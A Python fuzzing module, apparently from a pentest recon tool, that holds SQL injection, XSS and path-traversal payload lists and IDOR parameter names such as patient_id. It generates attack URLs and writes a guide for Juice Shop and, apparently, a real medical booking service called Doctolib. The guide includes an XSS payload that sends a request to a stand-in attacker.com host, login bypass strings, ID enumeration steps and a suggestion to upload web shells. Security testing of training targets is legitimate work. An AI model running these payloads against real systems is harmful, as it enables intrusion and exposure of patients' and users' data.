# fuzzer.py
"""
Light fuzzing and parameter discovery for web apps.
Includes common SQLi, XSS, and IDOR payloads.
No heavy dependencies - just basic fuzzing on discovered parameters.
"""

import re
from typing import List, Dict

# Juicy parameters (IDOR/ATAN candidates)
IDOR_PARAMS = [
    "id", "userId", "user_id", "uid", "accountId", "account_id",
    "playerId", "player_id", "profileId", "profile_id", "customerId", 
    "customer_id", "orderId", "order_id", "ticketId", "ticket_id",
    "invoiceId", "invoice_id", "productId", "product_id", "doctorId",
    "doctor_id", "patientId", "patient_id", "appointmentId", "appointment_id",
    "roomId", "room_id", "bookingId", "booking_id", "slotId", "slot_id",
    "betId", "bet_id", "transactionId", "transaction_id", "walletId", "wallet_id"
]

# Light SQLi payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 'a'='a",
    "1' UNION SELECT NULL--",
    "' and 1=1--",
    "' and 1=2--"
]

# Light XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    '"><script>alert("XSS")</script>'
]

# Path traversal / LFI payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....\\....\\....\\windows\\win.ini"
]

class ParamFuzzer:
    """Light fuzzer for parameter discovery and testing."""
    
    @staticmethod
    def flag_juicy_params(params: List[str]) -> Dict[str, str]:
        """
        Flag discovered parameters that are likely IDOR/ATAN candidates.
        Returns dict mapping param name → risk level.
        """
        flagged = {}
        for param in params:
            param_lower = param.lower()
            for idor_param in IDOR_PARAMS:
                if idor_param in param_lower:
                    if "id" in param_lower:
                        flagged[param] = "🔴 HIGH - Likely IDOR candidate"
                    else:
                        flagged[param] = "🟡 MEDIUM - Potential IDOR"
                    break
        
        # Also flag common sensitive params
        sensitive_keywords = ["token", "key", "secret", "auth", "session", "admin", "role"]
        for param in params:
            if param not in flagged:
                for keyword in sensitive_keywords:
                    if keyword in param.lower():
                        flagged[param] = "🟡 MEDIUM - Sensitive parameter"
                        break
        
        return flagged
    
    @staticmethod
    def generate_sqli_test_urls(base_url: str, param_name: str, payloads=None):
        """
        Generate SQLi test URLs for a given parameter.
        Returns list of URLs to test in Burp.
        """
        if payloads is None:
            payloads = SQLI_PAYLOADS[:5]  # Use first 5 for light fuzzing
        
        test_urls = []
        for payload in payloads:
            if "?" in base_url:
                test_url = f"{base_url}&{param_name}={payload}"
            else:
                test_url = f"{base_url}?{param_name}={payload}"
            test_urls.append(test_url)
        
        return test_urls
    
    @staticmethod
    def generate_xss_test_urls(base_url: str, param_name: str, payloads=None):
        """
        Generate XSS test URLs for a given parameter.
        """
        if payloads is None:
            payloads = XSS_PAYLOADS[:5]  # Use first 5 for light fuzzing
        
        test_urls = []
        for payload in payloads:
            # URL encode the payload
            encoded = payload.replace("'", "%27").replace('"', "%22").replace("<", "%3C").replace(">", "%3E").replace(" ", "%20")
            if "?" in base_url:
                test_url = f"{base_url}&{param_name}={encoded}"
            else:
                test_url = f"{base_url}?{param_name}={encoded}"
            test_urls.append(test_url)
        
        return test_urls
    
    @staticmethod
    def generate_idor_test_numbers(base_url: str, param_name: str, range_start=1, range_end=100):
        """
        Generate IDOR test URLs by substituting ID parameter with sequential numbers.
        Useful for testing against endpoints like /api/user/123 or ?userId=123
        """
        test_urls = []
        for num in range(range_start, range_end + 1):
            # Replace numeric values in URL
            test_url = re.sub(rf"{param_name}=\d+", f"{param_name}={num}", base_url)
            if test_url == base_url and "?" not in base_url:
                test_url = f"{base_url}?{param_name}={num}"
            test_urls.append(test_url)
        
        return test_urls
    
    @staticmethod
    def create_fuzzing_report(run_dir, params: List[str], urls: List[str]):
        """
        Create a fuzzing report with flagged params and test URLs.
        """
        report_path = f"{run_dir}/FUZZING_GUIDE.txt"
        
        flagged = ParamFuzzer.flag_juicy_params(params)
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write("=" * 70 + "\n")
            f.write("NetBear Fuzzing Guide - Juice Shop / Doctolib Recon\n")
            f.write("=" * 70 + "\n\n")
            
            f.write("DISCOVERED PARAMETERS\n")
            f.write("-" * 70 + "\n")
            if params:
                for param in params:
                    risk = flagged.get(param, "🟢 LOW - Standard parameter")
                    f.write(f"  {param:<30} {risk}\n")
            else:
                f.write("  (No parameters discovered)\n")
            
            f.write("\n" + "=" * 70 + "\n")
            f.write("QUICK FUZZING PAYLOADS (Copy to Burp Intruder)\n")
            f.write("=" * 70 + "\n\n")
            
            f.write("SQLi Test Payloads:\n")
            for i, payload in enumerate(SQLI_PAYLOADS[:5], 1):
                f.write(f"  {i}. {payload}\n")
            
            f.write("\nXSS Test Payloads:\n")
            for i, payload in enumerate(XSS_PAYLOADS[:5], 1):
                f.write(f"  {i}. {payload}\n")
            
            f.write("\nIDOR Test Strategy:\n")
            f.write("  1. Identify numeric ID parameters (id, userId, customerId, etc.)\n")
            f.write("  2. Capture request in Burp Proxy\n")
            f.write("  3. Send to Intruder → Cluster bomb on ID values\n")
            f.write("  4. Test range: 1-100 (or user count if known)\n")
            f.write("  5. Filter by response length - different lengths = different data access\n\n")
            
            f.write("=" * 70 + "\n")
            f.write("RECOMMENDED TEST FLOW FOR JUICE SHOP\n")
            f.write("=" * 70 + "\n\n")
            f.write("1. Stored XSS (Search → Search bar)\n")
            f.write("   Payload: <img src=x onerror=\"fetch('http://attacker.com/log?xss=1')\">\n\n")
            f.write("2. SQLi (Login → Email field)\n")
            f.write("   Payload: admin'--\n\n")
            f.write("3. IDOR (Basket → basketId parameter)\n")
            f.write("   Fuzz: /api/basket/1, /api/basket/2, etc.\n\n")
            f.write("4. Broken Authentication (Account → Try JWT manipulation)\n")
            f.write("   Check JWT tokens in XHR responses - decode/modify\n\n")
            f.write("5. File Upload (Upload page)\n")
            f.write("   Try: .exe, .jsp, .php with shells\n\n")
            
            f.write("=" * 70 + "\n")
            f.write("TEST URLS FROM CRAWL\n")
            f.write("=" * 70 + "\n\n")
            for url in urls[:20]:
                f.write(f"  {url}\n")
        
        return report_path
